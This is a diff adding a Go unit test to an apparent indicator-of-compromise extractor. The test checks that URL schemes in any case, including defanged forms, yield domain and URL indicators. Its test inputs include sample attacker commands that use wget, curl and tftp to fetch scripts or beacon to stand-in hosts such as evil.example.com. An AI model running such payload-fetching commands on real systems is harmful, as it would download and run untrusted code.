@@ -474,3 +474,36 @@ func TestExtractRefang(t *testing.T) {
 		t.Errorf("command IOC should preserve original defanged text, got %q", cmdVal)
 	}
 }
+
+func iocSet(iocs []*database.IOC) map[string]int {
+	m := map[string]int{}
+	for _, i := range iocs {
+		m[i.Type+":"+i.Value]++
+	}
+	return m
+}
+
+// curl and wget accept a scheme in any case, and refang turned "HXXPS://" into
+// "httPS://"; the case-sensitive URL pattern missed both.
+func TestExtractURLSchemeAnyCase(t *testing.T) {
+	e := NewExtractor()
+	for cmd, want := range map[string]string{
+		"wget HTTP://Evil.Example.com/x.sh":  "domain:evil.example.com",
+		"curl HXXPS://bad[.]example/beacon":  "domain:bad.example",
+		"tftp Ftp://files.evil.example/m.sh": "domain:files.evil.example",
+	} {
+		got := iocSet(e.Extract(makeIOCEvent("198.51.100.7", "command", cmd, nil)))
+		if got[want] == 0 {
+			t.Errorf("%q: missing %s (got %v)", cmd, want, got)
+		}
+		urls := 0
+		for k := range got {
+			if strings.HasPrefix(k, "url:") {
+				urls++
+			}
+		}
+		if urls != 1 {
+			t.Errorf("%q: %d URL IOCs, want 1 (got %v)", cmd, urls, got)
+		}
+	}
+}
